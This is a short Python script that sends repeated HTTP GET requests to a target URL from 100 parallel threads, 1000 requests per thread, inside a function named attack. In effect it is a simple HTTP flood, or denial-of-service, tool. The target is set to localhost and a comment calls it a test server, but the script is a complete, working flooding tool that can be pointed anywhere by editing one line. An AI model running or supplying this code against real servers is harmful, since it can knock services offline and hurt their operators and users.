import threading
import requests

target_url = "http://127.0.0.1"  # Change this to your test server

# Number of threads to run
num_threads = 100

# Number of requests per thread (or use an infinite loop if you like)
num_requests = 1000

def attack():
    for i in range(num_requests):
        try:
            response = requests.get(target_url)
            print(f"[+] Request sent! Status code: {response.status_code}")
        except Exception as e:
            print(f"[-] Error: {e}")

def main():
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
